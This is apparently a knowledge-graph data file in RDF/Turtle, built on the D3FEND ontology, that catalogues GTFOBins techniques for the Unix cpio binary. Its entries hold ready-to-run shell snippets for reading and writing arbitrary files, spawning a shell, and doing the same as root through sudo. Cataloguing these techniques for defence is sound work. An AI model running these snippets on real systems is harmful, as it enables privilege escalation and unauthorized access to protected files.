mknd:command_cpio-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpio-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The content of the file is printed to standard output, between the cpio archive format header and footer.",
        "The whole directory structure is copied to `$TF`." ;
    d3f:uses mknd:executable_cpio ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpio ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | cpio -dp $TF
cat "$TF/$LFILE"
""",
        """LFILE=file_to_read
echo "$LFILE" | cpio -o
""" .

mknd:command_cpio-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpio-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Copies `$LFILE` to the `$LDIR` directory." ;
    d3f:uses mknd:executable_cpio ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpio ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | cpio -up $LDIR
""" .

mknd:command_cpio-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpio-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_cpio ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpio ;
    mknd:provides mknd:function_shell ;
    mknd:value """echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
""" .

mknd:command_cpio-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpio-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Copies `$LFILE` to the `$LDIR` directory.",
        "The whole directory structure is copied to `$TF`." ;
    d3f:uses mknd:executable_cpio ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpio ;
    mknd:provides mknd:function_sudo ;
    mknd:value """LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | sudo cpio -R $UID -dp $TF
cat "$TF/$LFILE"
""",
        """LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | sudo cpio -R 0:0 -p $LDIR
""",
        """echo '/bin/sh </dev/tty >/dev/tty' >localhost
sudo cpio -o --rsh-command /bin/sh -F localhost:
""" .

